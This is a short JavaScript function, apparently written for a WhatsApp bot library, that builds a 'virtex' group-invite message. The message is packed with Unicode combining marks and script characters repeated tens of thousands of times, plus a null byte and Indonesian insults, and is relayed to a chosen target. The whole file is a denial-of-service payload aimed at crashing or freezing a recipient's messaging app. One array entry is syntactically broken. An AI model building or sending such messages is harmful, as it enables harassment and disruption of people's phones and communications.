async function Xphone(target) {
const virtex = [
    "𑇂𑆵𑆴𑆿𑆿".repeat(2000),
    "ꦽ".repeat(2000),
    "_*~@everyone~*_\n".repeat(500),
     "҉҈⃝⃞⃟⃠⃤꙰꙲".repeat(10000),
     "ᬼ".repeat(60000),
    "ោ៝".repeat(60000), 
    ".ؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕ".repeat(20000),
    "𑜦𑜠".repeat(60000), 
    "ًٌٍٍَُِِّّّْ".repeat(20000), 
    "ꦾ".repeat(60000), 
    "ۢ۬ۤۢ".repeat(20000),
    "᱃᳕‌‌‌ٍ٘‌ࣹ٘ۛ٘‌‌‌‌‌ࣹ‌ࣱ‌ࣰࣩۡ‌‌᳕‌ࣱࣱ᳕‌ࣹۛ‌‌‌ֻࣩ᳓ࣰًً᳕ܾࣶۡ᪳ࣧࣧ᪳‌ًًًࣶ֖֖᷽ࣼ᳚᪳".repeat(20000),
    " ҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈‌҉҉҉҉҈҈֟֟".repeat(2000),
    "𒄆".repeat(8000),
    "꧄".(8000),
    ];
  const msg = {
    groupInviteMessage: {
      groupJid: "1729151918238@g.us",
      inviteCode: "ꦽ".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "ANAK TOLOL" + "ꦾ".repeat(2500),
      caption: "SINI DRAMA AJG" + virtex,
      body: {
        text:
          "\u0000" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(25000) +
          "ꦽ".repeat(5000),
      },
    },
  };
  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}